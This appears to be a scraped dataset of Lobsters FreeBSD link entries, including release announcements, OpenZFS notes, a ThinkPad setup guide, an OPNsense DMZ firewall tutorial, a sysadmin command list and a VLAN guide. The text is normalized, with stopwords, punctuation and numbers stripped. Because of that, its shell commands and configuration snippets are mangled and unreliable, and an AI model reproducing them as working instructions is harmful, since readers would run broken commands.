92,Lobsters,freebsd,FreeBSD,FreeBSD 11.4-BETA2 Now Available,https://lists.freebsd.org/pipermail/freebsd-snapshots/2020-May/000700.html,freebsd available,freebsd available gjb freebsdorg http http http http http wwwfreebsdfoundationorgdonate information freebsdsnapshots mailing list,freebsd available glen barber gjb freebsdorg sat may utc begin pgp signed message hash second beta build release cycle available installation image available generic generic powerpc generic generic bananapi beaglebone cubieboard cuboxhummingboard rpib wandboard generic note regarding arm sd card image convenience without console access system freebsd user password freebsd available default ssh access additionally root user password set root strongly recommended change password user gaining access system installer image memory stick image available http image checksum follow end email notice problem report bugzilla pr system stable mailing list would like use svn source based update existing system use branch summary change since includes llvm clang compilerrt libc libunwind lld lldb openmp updated version issue loaderlua fixed linker issue fixed two security issue libalias fixed procfs based process debugging deprecated various potential system panic resolved issue booting recent linux kernel via bhyve fixed ubsec driver marked deprecated list change since available release note http please note release note page yet complete updated ongoing basis cycle progress virtual machine disk image vm disk image available architecture disk image may downloaded following url freebsd download mirror http partition layout kb freebsdboot gpt partition type bootfs gpt label gb freebsdswap gpt partition type swapfs gpt label gb freebsdufs gpt partition type rootfs gpt label disk image available vhd vmdk raw disk image format image download size approximately mb mb respectively decompressing gb sparse image note regarding virtual machine image modified qemu efi loader file needed able boot virtual machine image see page information http boot vm image run cpu virt bios qemuefifd serial telnet server nographic drive ifnone filevmdisk device virtioblkdevice device virtionetdevice netdev user sure replace vmdisk path virtual machine image amazon ami image amis available following region region region region region region region region region region region region region region region region region vagrant image image available hashicorp atlas site installed running vagrant init vagrant upgrading freebsdupdate utility support binary upgrade system running earlier freebsd release system running earlier freebsd release upgrade follows freebsdupdate upgrade r process freebsdupdate may ask user help merging configuration file confirming automatically performed merging done correctly freebsdupdate install system must rebooted newly installed kernel continuing shutdown r rebooting freebsdupdate need run install new userland component freebsdupdate install recommended rebuild install application possible especially upgrading earlier freebsd release example freebsd alternatively user install compatibility library afterwards system must rebooted new userland shutdown r finally rebooting freebsdupdate need run remove stale file freebsdupdate install iso checksum generic generic powerpc generic generic bananapi beaglebone cubieboard cuboxhummingboard rpib wandboard generic vm image checksum regard glen love freebsd support future release donation freebsd foundation http wwwfreebsdfoundationorgdonate begin pgp signature end pgp signature information freebsdsnapshots mailing list
93,Lobsters,freebsd,FreeBSD,FreeBSD Journal - Filesystems - 2020 Issue 03/04,https://www.freebsdfoundation.org/past-issues/filesystems/,freebsd journal filesystems issue,table content click start reading,table content click start reading
94,Lobsters,freebsd,FreeBSD,OpenZFS 0.8.4 Released,https://github.com/openzfs/zfs/releases/tag/zfs-0.8.4,openzfs released,supported kernel change reload reload,supported kernel compatible linux kernel change add missing zfsrefcountdestroy keymappingrele linux compat blkallocqueue prefix struct rangelock fix icp include directory intree build icp gcmavx support architecture lacking movbe instruction icp improve aesgcm performance bugfixfix uio partial copy prevent deadlock arcread linux memory reclaim callback fix infinite scan pool special allocation static symbol exported icp linux compat struct procops linux compat timestamptruncate linux compat linux compat timet fix static data link fnocommon zfsget change time format string k h deprecate deduplicated send stream fix zfsfunctions packaging bug initramfs eliminate substitution delete built init script make clean restore makefileam make init script depend makefile systemd mount generator nt fail keyload file already loaded systemd mount generator generate noauto unit add control property systemd mount generator silence shellcheck warning fix configmodulesno linux kernel config linux compat blkgtryget zfsmountgenerator fix escaping missed wakeup growing kmem cache order zfsimport service multipathd avoid heredocuments systemd mount generator perform action time signed another tab window reload refresh session signed another tab window reload refresh session
95,Lobsters,freebsd,FreeBSD,FreeBSD on Lenovo Thinkpad T480,https://www.davidschlachter.com/misc/t480-freebsd,freebsd lenovo thinkpad,freebsd lenovo thinkpad progress intel graphic trackpad trackpoint merged default michael gmelin wifi network pci passthrough linux virtual machine bhyve suspend resume man tpm screen brightness article brightness increment detail sound rebuilt kernel kernel module camera window manager hidpi gui issue common issue configuration file etcrcconf etcsysctlconf bootloaderconf,freebsd lenovo thinkpad last updated august recently replaced macbook air lenovo thinkpad installed freebsd currently page document setup along various configuration tweak fix working wqhd screen hidpi wifi ir visible light camera suspend resume sound see note headphone jack trackpad trackpoint usb port working bluetooth cause hang reboot driver available support freebsd progress nt thunderbolt device test nt fingerprint sensor installed intel graphic xorg requires intel video driver package metapackage drmkmod found building port work reliably installing package installation load boot adding kldlist etcrcconf best success using driver default modesetting driver work frequent screen tearing want install use sna acceleration option default uxa method slow eg rendering marching ant gimp freeze program use following configuration file placed section device identifier intel graphic driver intel option accelmethod sna option tearfree true endsection trackpad trackpoint good news since udevlibinput merged default xorgserver trackpad setup much easier previously configuration inspired blog post michael gmelin found setting kernevdevrcptmask rather suggested xorgserver package expose key x settable hotkeys trackpoint button trackpad working expected use following configuration file section inputclass identifier libinput keyboard catchall matchiskeyboard matchdevicepath devinputevent driver libinput option xkbrules evdev endsection section inputclass identifier libinput touchpad catchall matchistouchpad matchdevicepath devinputevent driver libinput option naturalscrolling option tapping option disablewhiletyping option accelspeed endsection wifi network ghz network wo nt visible unless country code properly set wifi interface otherwise connectivity limited band set country code canada ca line etcrcconf wpa country ca powersave wifi also limited speed intel wireless card tried using pci passthrough linux virtual machine bhyve use speed nt figured keep working suspendresume suspend resume enable suspend resume lid close add etcsysctlconf note tpm must disabled bios suspendresume work supported tpm model listed man tpm guess tpm yet supported according manual page tpm must told save state suspend otherwise resume fail screen brightness currently using acpivideo see article brightness increment detail sound sound great speaker really bad headphone jack lot static distortion lower volume nothing heard march problem present suspect fixed temporary fix downloaded source code hda driver stable branch corresponding directory usrsrc rebuilt kernel kernel module change get merged release branch fixed headphone jack audio camera ir camera camera option included wqhd screen setting webcamd default setting infrared camera working fine creepy night vision usbconfig show two camera device bison integrated ir camera mdhost spdhigh pwrsave sunplusit inc integrated camera mdhost spdhigh pwrsave use visible light camera instead ir camera set etcrcconf indicate right device use eg webcamdenable yes b alternatively set camera shown etcrcconf apps ask one want use able use webcam firefox adding user webcamd group installing packges window manager hidpi gui issue hidpi support scaling factor must set using xrandr xinitrc xrandr dpi xrdb merge homexresources exec start window manager generated configuration limited default loaded configuration eg generated config hotkey exit copy example configuration starting point mkdir p cp default cursor tiny increase size cursor select cursor theme multiple cursor size set cursor size xresources xcursorsize xcursortheme whiteglass however seems work create following symlink ln usrlocalshareicons icon point issue cursor would still small gtk apps firefox fix set cursor theme xresources using external monitor default hidpi scaling xinitrc applied use different scaling eg dpi first calculate quotient hidpiext monitor dpi case set monitor using command xrandr output mode scale rightof work well displaying mouse appears unable exceed dimension internal monitor external display appears common issue nt figured yet configuration file anything described etcrcconf added installer cleartmpenable yes syslogdflags s sendmailenable none hostname ntpdateenable yes ntpdenable yes set dumpdev auto enable crash dump disable dumpdev auto zfsenable yes power saving see http powerdxxenable yes performancecxlowest cmax economycxlowest cmax intel graphic driver kldlist readable font size console allscreensflags f xorg dbusenable yes nt pause boot dhcp backgrounddhclient yes networking use ethernet available otherwise use wifi http wwwfreebsdorgdochandbooknetworkaggregationhtml wpa country ca powersave wlanaddr mac address clonedinterfaces laggproto failover laggport laggport dhcp webcam webcamdenable yes visible light camera ir camera cup allow printing cupsdenable yes etcsysctlconf added installer allow sleep lid close disable system bell bell everywhere allow mounting fuse filesystems bootloaderconf added installer aesniload yes geomeliload yes kerngeomlabeldiskidentenable kerngeomlabelgptidenable zfsload yes improved power video support acpiibmload yes webcam cuseload yes wifi ifiwmload yes yes touchpad driver hwpsmsynapticssupport fuse fusefsload yes place device low power state suitable driver found man pci
96,Lobsters,freebsd,FreeBSD,How to Create Basic DMZ Network in OPNsense,https://homenetworkguy.com/how-to/create-basic-dmz-network-opnsense/,create basic dmz network opnsense,introduction nice writeup click two approach implementing basic dmz configure vlans vlans port isolation single switch router stick link aggregation lag note physical network approach assign dmz interface logical network approach create vlan interface assign dmz vlan interface configure vlans network switch wrote creating vlans managed tplink switch common step approach configure enable dmz interface enable dhcp dmz interface create static dhcp lease optional firewall rule allow access internal dns server block access internalexternal dns server nat port forward rule allow access dmz network interface block access internalprivate network allow access traffic allow access web server dmz http conclusion,introduction dmz demilitarized zone segmented part network used host publicly accessible website service intention protect internal network external threat effective strategy minimize public exposure critical asset well limit damage caused intruder able penetrate network great definition dmz found received feedback visitor site noticed screenshots dmz interface wanted know created dmz network thought would great topic cover researching dmz implementation writing howto came across nice writeup implementing basic dmz well implementing advanced secure dmz another good reference click basic dmz example pretty much approach took home network partially due inexperience partially due minimizing expense purchasing additional hardware limiting scope howto basic dmz example since imagine many home network user using single routerfirewall manage multiple logicalphysical network basic dmz implementation budget friendly easier implement option due requiring le hardwaresoftware purchase configure maintain however trade le security le security mean someone compromise routerfirewall box extent full visibility network including internal private network type compromise occurs already big problem depending quality routerfirewall may may easy task attacker basically putting egg one basket approach home network user think fact alone sway away using single routerfirewall network still lot secure using single network exposing various port server internet using standard consumergrade router receives little security update advanced dmz implementation mitigates issue compromise internal private network effectively since attacker would compromise second firewall perhaps device behind second firewall penetration network could occur device behind second firewall would practically invisible dmz network especially traffic dmz network dropped dmz internal network important note also drop traffic dmz internal network basic dmz approach routerfirewall compromised attacker much likely snoop traffic attempt compromise device internal network since attacker see configured network interface device firewall rule two approach implementing basic dmz least two approach may consider implementing basic dmz using single routerfirewall imagine approach limiting discussion two slightly different approach routerfirewall one ethernet port may put device network switch separate physical port two physical port configured separate physical networkssubnets benefit approach need know configure vlans hardware support vlans configuration simple also could alleviate potential bottleneck since le port shared compared vlans trunk port may transport traffic several network link however mitigated various way mentioned negative aspect using two separate physical network need purchase physical switch network creating unless perhaps could make use port isolation single switch could get messyconfusing device network need utilize network switch network switch physically distant running cable could become issue especially need change network device would need run new cable different network switch another location one reason vlans created since flexibility device located anywhere exist network using switch proper vlan configuration using one port routerfirewall router stick configuration create dmz using vlans create vlans creating separate logical network share existing physical port flexibility vlans offer many benefit including saving cost network hardware need buy new switch every time want create new network also virtual network span across different switch nice run cabling switch network connect nearest switch instead keep mind potential downside could create bottleneck lot traffic flowing single link improve situation using link aggregation lag using larger bandwidth trunk port gbps link note still use vlans also multiple port routerfirewall logicalvlan approach except using vlans across multiple port routerfirewall could help alleviate bottleneck without using link aggregation link aggregation would still better high bandwidth need diagram two approach physical network approach default opnsense setup wan lan interface detects network appliance one ethernet port simplicity going assume already default interface configured need create additional interface dmz network need ethernet port available order create another physical network physical network example us port wan lan dmz network assign dmz interface assign new interface dmz network go interface assignment page bottom page see new interface section select appropriate physical port dropdown box example chose third ethernet port since numbering start zero interface could different depending hardware configuration enter description interface show left sidebar panel click button assign interface logical network approach implementing logicalvlan approach extra step must take assigning interface must first create vlan interface assign create vlan interface create vlan interface go interface type vlan page click add button open vlan interface page select parent interface want create vlan interface interface physical ethernet port want use vlan may create multiple vlans parentphysical port vlans allow create many logical network exist single physical network example used interface second ethernet port logical network example need port wan landmz network lan dmz network share second port please note assuming already default wanlan interface configured lan already created interface interface could different depending hardware ethernet port assignment enter vlan tag number typically like use number subnet vlan use convention example using network dmz chose vlan tag choose vlan priority network traffic may useful congested network probably help much otherwise perhaps live streamingvoip application may important use vlan priority enter description vlan interface name visible making interface assignment name something useful like name vlan assigned interface name easier match vlans interface also make vlan configuration appear consistent throughout web interface click save save vlan interface configuration assign dmz vlan interface assignment logicalvlan interface similar physical interface except select dmz vlan interface instead physical interface dropdown box configure vlans network switch take logical networkvlan approach need configure vlans network switch vlan idtag example dmz us vlan idtag due number switch market difference configure vlans describe detail wanted mention must configure vlans network switch approach function properly another reason mentioned setting two physical network le complex use basic unmanaged switch physical network logical network using vlans must use vlanaware switch one important step creating vlans switch set port switch router connected taggedtrunk port carry vlan traffic opnsense need worry setting router port switch connected taggedtrunk port since opnsense know properly vlan interface would like quick vlan reference network switch wrote creating vlans managed tplink switch affiliate link common step approach dmz interface assigned remaining step physical logical interface treated even assignment interface similar thought important explain step separately provide clear explanation approach since logical networkvlan approach requires extra step assigning interface rest interface creation firewall rule also approach dmz interface referenced firewall rule way physical logical network configure enable dmz interface dmz interface assigned listed interface sidebar menu click dmz interface configure interface click enable interface prevent interface removal checkboxes prevent interface removal option prevents deleting interface assignment page useful safeguard accidentally mess network configuration bad way may notice logicalvlan interface device name slightly different screenshot show instead ok indicates vlan interface used instead physical interface want bother different screenshots device name slight difference description already filled dmz since added assigned interface next select static configuration type may also enable well simplicity showing scroll farther page see configuration selected static configuration type enter ip address interface example indicate range network address interface select dropdown box indicate network address range usable address finally click save button save interface change also need click apply change button top page activate change enable dhcp dmz interface many user want enable dhcp assign address done manually individual device network go service dmz page configure dhcp dmz network click enable dhcp server dmz interface checkbox enter box box may choose different range plan static ip address leave room make sure static ip address overlap dhcp address range ip address conflict could occur also start range since dmz interface address act gateway ip address device dmz network click save button save enable dhcp dmz network create static dhcp lease optional running server hosting various service likely want use static ip address use port forwarding add appropriate firewall rule prefer use dhcp static mapping rather go device manually configure ip address setting allows manage static ip address centralized management interface add new static dhcp lease service dmz page prefer go service lease page reason prefer lease page button use add new static dhcp lease prepopulate mac address static dhcp mapping page go lease page anyway copy mac address go device find mac address type make sense add new static lease lease page handy shortcut may use said click button device want create static dhcp mapping static dhcp mapping page open mac address prepopulated enter ip address serverdevice hostname device may much creative hostname example hostname entered actually override hostname set system keep mind like hostname configured server enter hostname refer server device network name prefer fact hostname overridden helpful device network seem allow change default hostname ocd need refer device easier randomly generated name use static dhcp mapping clean hostnames also mean static ip address normally issue firewall rule point networksinterfaces wan lan dmz last major step set firewall rule network traffic properly isolated number way may go creating firewall rule rule depend service planning hosting also depends strict wish network traffic going explain basic approach used configure network especially first learning write firewall rule approach work well several vlansnetworks manually add new network ip address range isolate network every time create new vlannetwork general idea allow specific traffic network interfacegateway block specific traffic internalexternal network allow specific traffic device internal network block access internal network isolate network traffic allow anything else allow internet access last allow rule could get strict allowing specific type traffic httphttps etc access lot service many different port could take time determine everything need allow something want eventually network lock thing tighter firewall rule ordered specific rule least specific rule since rule evaluated top bottom list rule triggered given data packet rule processed packet depending allowing blocking order important sometimes need allow traffic blocking traffic time want block traffic allowing traffic basic set rule may want implement dmz network provides isolation dmz lan dmz network access anything lan network protects attack originating dmz allow access internal dns server block access internalexternal dns server allow access dmz network interface block access internalprivate network allow access traffic lan network need similar set rule illustration purpose going assume web server dmz want lan access lan additional rule allow network traffic following rule block everything lan network dmz network except access web server dmz allow access internal dns server block access internalexternal dns server allow access lan network interface allow access server dmz http block access internalprivate network allow access traffic minimize repetition describe dmz rule except one lan rule access dmz web server since rule similar reference different network rule let u get started allow access internal dns server allow access opnsense unbound dns server default dns server opnsense need allow port dmz address allow access router ip assume since created separate network interface ip address act gateway ip address since dhcp service provides client dmz address example configured interface option value action pas interface dmz protocol tcpudp source dmz net source port destination dmz address destination port dns description allow internal dns server block access internalexternal dns server want control access dns dns filteringblocking need prevent rogue user device using alternate dns server rule block dns server rogue user forced use proper dns server rogue device usually fall back default network configured dns server however may device hardcoded google dns server block fail resolve seems like google device may fall category perhaps want track situation want redirect dns request rather block possible using nat port forward rule tried since blocking rogue dns server work fine network course keep mind nonstandard dns port doh dns http used dns query could still get network http normally always allowed blocking mainly rogue device novice user rather tech savvy rogue user could find way around firewall malicious insider already big problem option value action block interface dmz protocol tcpudp source dmz net source port destination destination port dns description block internalexternal dns server allow access dmz network interface rule allows access dmz network interface ping interface desire also access opnsense web administration dmz interface address course block access another rule bad idea dmz since allowing public access server also rule necessary next firewall rule block private network without network would internet access since interfacegateway ip address would blocked see detailed explanation option value action pas interface dmz protocol source dmz net source port destination dmz address destination port description allow access dmz network interface block access internalprivate network isolate dmz network internal network need block access easiest way block private ip address range add new network need update list network block ensures forget block new network good safeguard securing network note dmz network us private ip address worry rule blocking anything within dmz network traffic device network stay network local traffic need routed network mean need exclude dmz network creating rule dmz network however need allow access interface ip address allow access internet explained rule new networking important note use firewall rule router block access two device network block traffic two different network traffic passing network traffic pas two physical logical network must routed router best want block access two device network make use firewall installed device unable install firewall device put separate network prevent access option value action block interface dmz protocol tcpudp source dmz net source port destination privatenetworks destination port description block internalprivate network may notice destination made use firewall rule alias called privatenetworks see privatenetworks option rule create alias alias nice reusing certain value also help make rule readable alias help reduce number rule need create allow combine multiple value single alias create alias go firewall alias page click button bottom right corner alias list table enter name privatenetworks wan pick network type enter network includes entire private ip address range allow access traffic finally allow traffic allows access external network provide internet access strict rule rule act like consumer router allows access anything internet could use starting point monitor traffic see port using allow port lock thing dmz network would probably good idea gaming network instance may annoyed allow access every port game option value action pas interface dmz protocol source dmz net source port destination destination port description allow access traffic lan allow access web server dmz http allows device lan network access web server dmz ip address recommend creating alias server plan reference several rule also make rule readable well multiple service hosted server different port create alias multiple port would use alias rather specific port number using alias eliminates need create separate rule different port number approach taken multiple web server put rule using alias option value action pas interface lan protocol tcp source lan net source port destination destination port http description allow access web server dmz network conclusion fully functioning dmz network keep mind configuration secure flatsingle network still vulnerable attack advanced dmz internal lan higher risk attacked routerfirewall compromised however advanced home network pretty secure platform like opnsense receives frequent update approach may quite adequate home networking need
97,Lobsters,freebsd,FreeBSD,List of Useful FreeBSD Commands,https://medium.com/@tdebarbora/list-of-useful-freebsd-commands-92dffb8f8c57,list useful freebsd command,http wttrin http mediumcom http mediumcom rsync command check example script perfrom local offsite backup lamp stack application mysql viewing manipulating file log dns related command freebsdbot,list useful freebsd commandsbelow list favorite command often use daily system administration duty others use fun hope reader find informative learn thing end post also work linuxcheck weatherinstall curl pkg install curlnow check weather curl http wttrinever wonder development stack cm website using install whatweb pkg install whatwebfind stack site us whatweb mediumcomhttp mediumcom moved permanently cloudflare cooky cfduid cfruid country united state u httpserver cloudflare httponly cfduid cfruid ip redirectlocation http mediumcom title moved permanently uncommonheaders cfcachestatus xcontenttypeoptions cfray altsvc cfrequestid http mediumcom ok cloudflare cooky cfduid cfruid optimizelyenduserid sid uid country united state u email sentryio googleanalytics universal httpserver cloudflare httponly cfduid cfruid sid uid ip opengraphprotocol website opensearch osdxml script applicationldjson stricttransportsecurity includesubdomains preload uncommonheaders sepiaupstream mediumfulfilledby xenvoyupstreamservicetime cfcachestatus expectct xcontenttypeoptions cfray altsvc cfrequestid xframeoptions allowfrom mediumcom check reboot required freebsd system version match reboot required uname r freebsdversioncheck reboot required debian based system output read file directory reboot required cat varrunrebootrequiredgnuwatch watch linux helpful command used conjunction command give output option provide continued realtime output command example anyone ever managed mailpostfix server familiar another one go command mailq command print queued message pending delivery due various reason blocked spam list user system sending email incorrect address soften time discover issue mail delivery go command determine reason identified root cause resolved issue nothing satisfying seeing number message queue go lower lower released queueinstall gnuwatch pkg install gnuwatchto monitor mailq print update every second would simply run gnuwatch n mailqctrlc closeanother equally awesome command monitor mailq real time provides comprehensive overview queue pfqueueinstall pfqueue pkg install pfqueuecheck mailq pfqueueaww yea empty mailq like see rsync commandsrsync powerful tool copy file locally remotely also scripted create backup script check example script perfrom local offsite backup lamp stack applicationsinstall rsync pkg install rsyncsync local folder nginx local directory external drive nfs share rsync av rootbackupnginx incremental file byte received byte bytessectotal size speedup local folder remote server ssh known push rsync avzh username host localfolder remotefilestocopysync folder remote system local machine know pull rsync avzh username host localfolder remotefilestocopysync directory excluding subdirectory rsync excludefoldertoexclude avhp localfolderusername host remotefoldertocopyfilestomysqlexport mysql database mysqldump u username p databasename datadumpsqlimport mysql databaselogin mysql consolemysql u root pcreate database name already exist create database newdatabase import database mysql u username p newdatabase datadumpsqlreset mysql root password service mysqld stop mysqldsafe skipgranttables mysql userroot mysql update user set passwordpassword newpassword user root flush privilege exit viewing manipulating file logsview file cat filenametxttail log file realtime viewing example mail log tail varlogmaillogsearch file specific word example searching mailq email address useful trying track issue inbox may receiving sending mail tail f varlogmaillog grep email domaincom sometimes helpful narrow looking viewing line targeted wordthis command display five line outputting looking tail f varlogmaillog grep email domaincom print line outputting looking tail f varlogmaillog grep b email domaincom search file contain word grep r somewordor phrase grep r word phrase list file contain word method much cleaner faster command word use casesensitive grep rli wordor want search txt file combine find find somedir name txt exec grep li searchstring append text existing file echo add text end file filetxtprepend text exiting file add text beginning file printf sn add begining w ed textfiletxtor prepend multiple line printf sn line line w ed textfiletxdelete file x day old directorythe command purge file within usrjailsezjailarchives day older find usrjailsezjailarchives mtime exec rm delete file folder day old find folderlocation mtime exec rm rf search entire file system file name find name filenamefind file searching part name specific directory find pathoffoldertobesearched name untraceable compress file targz tar czvf archivenametargz pathtodirectoryorfileunpack file created tar xzvf archivenametargzdns related commandscheck domain us dnssec see rrsig record reply dnssec requestediscorg support dnssec dig dnssec iscorg dnskey dig dnssec iscorg dnskey global option cmd got answer header opcode query status noerror id flag qr rd ra query answer authority additional opt pseudosection edns version flag udp question section iscorg dnskey answer section iscorg dnskey dnskey rrsig dnskey iscorg rrsig dnskey iscorg query time msec server sat may edt msg size rcvd support dnssec dig dnssec ypcrcom dnskey dig dnssec ypcrcom dnskey global option cmd got answer header opcode query status noerror id flag qr rd ra query answer authority additional opt pseudosection edns version flag udp question section ypcrcom dnskey authority section ypcrcom soa dnsjomaxnet query time msec server sat may edt msg size rcvd name server domain name host n domaincomdomaincom name server name server name server name server domain mail server mx record host mx gmailcomgmailcom mail handled mail handled mail handled gmailsmtpinlgooglecomgmailcom mail handled mail handled domain txt record find spf record host txt hotmailcomhotmailcom descriptive text include spfprotectionoutlookcom include spfaoutlookcom include spfboutlookcom include spfahotmailcom include spfssgbmicrosoftcom include spfssgcmicrosoftcom hotmailcom descriptive text lookup domain s soa record host soa yahoocomyahoocom soa record hostmasteryahooinccom dns ttl value must use domain n server found host n domaincom default dns server authoritative server zone digging dig show time remaining next refresh instead raw ttl value position short without defining name server dig use network name server lookup name server domain using host n domaincom dig nocmd noall answer nameserverinusebydomain domaincomorlookup dns ttl value count dig nocmd noall answer domaincomnote dig tool installed default recent version freebsd dig ship bind removed base system alternately use drill replacedldnstools replaced bind share syntax dig also obtain dig installing bindtools pkg install bindtoolscommand lookup public ip behind natrouter dig short domaincom pro tip never miss freebsd related post twitter follow freebsdbot retweets everything freebsdenjoy
98,Lobsters,freebsd,FreeBSD,FreeBSD 11.4-BETA1 Now Available,https://lists.freebsd.org/pipermail/freebsd-stable/2020-May/092284.html,freebsd available,freebsd available gjb freebsdorg http http http http wwwfreebsdfoundationorgdonate information freebsdstable mailing list,freebsd available glen barber gjb freebsdorg sat may utc begin pgp signed message hash first beta build release cycle available installation image available generic generic powerpc generic generic bananapi beaglebone cubieboard cuboxhummingboard rpib wandboard generic note regarding arm sd card image convenience without console access system freebsd user password freebsd available default ssh access additionally root user password set root strongly recommended change password user gaining access system installer image memory stick image available http image checksum follow end email notice problem report bugzilla pr system stable mailing list would like use svn source based update existing system use branch virtual machine disk image vm disk image available architecture disk image may downloaded following url freebsd download mirror http partition layout kb freebsdboot gpt partition type bootfs gpt label gb freebsdswap gpt partition type swapfs gpt label gb freebsdufs gpt partition type rootfs gpt label disk image available vhd vmdk raw disk image format image download size approximately mb mb respectively decompressing gb sparse image note regarding virtual machine image modified qemu efi loader file needed able boot virtual machine image see page information http boot vm image run cpu virt bios qemuefifd serial telnet server nographic drive ifnone filevmdisk device virtioblkdevice device virtionetdevice netdev user sure replace vmdisk path virtual machine image amazon ami image amis available following region region region region region region region region region region region region region region region region region vagrant image image available hashicorp atlas site installed running vagrant init vagrant upgrading freebsdupdate utility support binary upgrade system running earlier freebsd release system running earlier freebsd release upgrade follows freebsdupdate upgrade r process freebsdupdate may ask user help merging configuration file confirming automatically performed merging done correctly freebsdupdate install system must rebooted newly installed kernel continuing shutdown r rebooting freebsdupdate need run install new userland component freebsdupdate install recommended rebuild install application possible especially upgrading earlier freebsd release example freebsd alternatively user install compatibility library afterwards system must rebooted new userland shutdown r finally rebooting freebsdupdate need run remove stale file freebsdupdate install iso checksum generic generic powerpc generic generic bananapi beaglebone cubieboard cuboxhummingboard rpib wandboard generic vm image checksum regard glen love freebsd support future release donation freebsd foundation http wwwfreebsdfoundationorgdonate begin pgp signature bsmh end pgp signature information freebsdstable mailing list
99,Lobsters,freebsd,FreeBSD,Getting started with FreeBSD as a desktop operating system,https://opensource.com/article/20/5/furybsd-linux,getting started freebsd desktop operating system,freebsd port package collection following lot written instruction desktopinstaller furybsd getting startedtxt configure xorg furybsd pkg dnf apt freebsd handbook absolute freebsd edition,freebsd great operating system design come desktop environment without installing additional software freebsd port package collection freebsd commandline experience screenshot show logging freebsd look like every one optional system component selected installation freebsd turned desktop operating system wide selection desktop environment take time effort following lot written instruction using desktopinstaller package provides user option textbased menu help automate much process still timeconsuming biggest problem either method user might find system fully compatible freebsd taken time set thing furybsd solves problem providing live desktop image user evaluate installing currently furybsd provides xfce image kde image image provides installation freebsd desktop environment preinstalled user try image find hardware work install furybsd readytogo desktop operating system powered freebsd purpose article using xfce image kde image work exact way getting started furybsd familiar process anyone installed linux distribution bsds unixlike open source operating system download iso furybsd website copy flash drive boot computer flash drive booting flash drive fails make sure secure boot disabled booting flash drive desktop environment load automatically addition home file system trash icon live desktop icon tool configure xorg getting started instruction furybsd installer system information utility extra custom xfce setting wallpaper desktop environment come much beyond basic xfce application firefox basic graphic driver loaded point enough check see system wired wireless network interface supported furybsd none network interface working automatically getting startedtxt file contains instruction attempting configure network interface configuration task least one network interface work configure xorg application used install intel nvidia virtualbox graphic driver driver downloaded installed xorg need restarted system automatically relogin live image user password furybsd configured graphic driver carry installed system everything work well live environment furybsd installer configure install furybsd onto computer installer run terminal provides option found bsd linux installers user asked set system hostname configure zfs storage set root password add least one nonroot user configure time date setting process complete system rebooted preconfigured freebsd xfce kde desktop furybsd hard work even took extra effort make desktop look nice noted desktop environment come lot preinstalled software installing additional package almost certainly necessary quickest way using pkg command terminal command behaves much like dnf apt user coming linux distribution us one feel right home come finding installing package freebsd package collection large bigname open source software package available user trying furybsd without much freebsd experience consult freebsd handbook learn thing freebsd way user experience using linux distribution one bsds able figure lot thing difference handbook help clarify another great resource learning freebsd way thing absolute freebsd edition michael w lucas
100,Lobsters,freebsd,FreeBSD,FreeNAS Odroid H2 Home Build,https://www.youtube.com/watch?v=ophrR-fXmPc,freenas odroid home build,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature freenas odroid home build youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature freenas odroid home build youtube
101,Lobsters,freebsd,FreeBSD,GhostBSD 20.04 Overview,https://www.youtube.com/watch?v=MPHFHBi9734,ghostbsd overview,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature ghostbsd overview simple elegant desktop bsd operating system youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature ghostbsd overview simple elegant desktop bsd operating system youtube
102,Lobsters,freebsd,FreeBSD,OPNSense Suricata IDS/IPS versus Kali Linux Attack,https://www.youtube.com/watch?v=oUp09mcn3Zc,opnsense suricata idsips versus kali linux attack,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature suricata id ip v kalilinux attack youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature suricata id ip v kalilinux attack youtube
103,Lobsters,freebsd,FreeBSD,FreeBSD UNIX for Linux Sysadmins,https://triosdevelopers.com/jason.eckert/blog/Entries/2020/5/2_FreeBSD_UNIX_for_Linux_sysadmins.html,freebsd unix linux sysadmins,,
104,Lobsters,freebsd,FreeBSD,Understanding VLAN Configuration on FreeBSD,https://genneko.github.io/playing-with-bsd/networking/freebsd-vlan/,understanding vlan configuration freebsd,understanding vlan configuration freebsd terminology vlan bridge target topology epair tl dr etcrcconf etcjailconf switch learn manual configuration jail additional topic allow host access jail directly let host route traffic jail vlans note bridge parent interface vlans use another freebsd host emulate switch reference revision history,understanding vlan configuration freebsd recently never chance use vlans freebsd host though sometimes configure ethernet switch playing vnet jail suddenly got interested vlan configuration freebsd experimented time wrote short article summarize current understanding configure vlans freebsd terminology think word vlan used least two different sens narrow sense stand ieee vlan tagging freebsd implemented vlan logical interface subinterface broader sense word vlan used describe layer network physically logically created wider network single ethernet switch vlan regarded virtual switch selected subset ethernet port freebsd represented bridge article use word latter sense thus word vlan bridge interchangeable case vlan narrow sense use tagged trunk port interface target topology set goal create following network topology ethernet switch freebsd host vnet jail switch capability act router network later also try host forward ip traffic vlans network engineer engineer kind might something make sense real network anyway going note assumption four vlans corresponding ip subnets network vlan subnet vlan used link host switch traffic vlan untagged vlan distributed across network exist physically switch port virtually inside host bridged jail network part vlans connected trunk tagged link host switch delivers tagged packet containing vlan id addition untagged native vlan traffic traffic different subnets always going switch router network gateway address vlans vlan vlan vlan vlan host single ip address reach jail directly address jail subnet instead host communicates jail via switch host default gateway vnet jail connected corresponding bridge epair epair b end eg decided attach b end b bridge bridge end jail tl dr short could achieve goal adding following line standard configuration file etcrcconf host part vlans configured way create bridge vlans epairs vlan interface clonedinterfaces assign ip address host untagged native interface point default gateway switch vlan address defaultrouter bring interface added bridge side epairs epairxa assigned ip address jail add tagged untagged epairxb member bridge addm addm addm addm addm addm addm addm addm etcjailconf jail given end corresponding epair vnetinterface brevity use execstart assign ip gateway address jail might common jail etcrcconf execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs hosthostname name path vm name execconsolelog varlogjail name consolelog vnet vnetinterface vif execstart ifconfig vif addr execstart route add default gw workaround http bugsfreebsdorgbugzillashowbugcgi execprestop ifconfig vif vnet name vif addr gw vif addr gw vif addr gw vif addr gw vif addr gw vif addr gw switch pseudoconfig imaginary switch vlan vlan vlan interface port switchport mode trunk switchport trunk allowed vlan interface range port switchport mode access switchport access vlan interface range port switchport mode access switchport access vlan interface range port switchport mode access switchport access vlan interface vlan ip address interface vlan ip address interface vlan ip address interface vlan ip address surprisingly amount required configuration much le expected learn manual configuration next trying explain step vlan configuration manual configuration becomes somewhat lengthy show freebsd construct vlans let start following configuration host configured switch vlans ip address properly setup create three bridge host form separate vlan ifconfig create ifconfig create ifconfig create create logical interface vlan parent interface add bridge 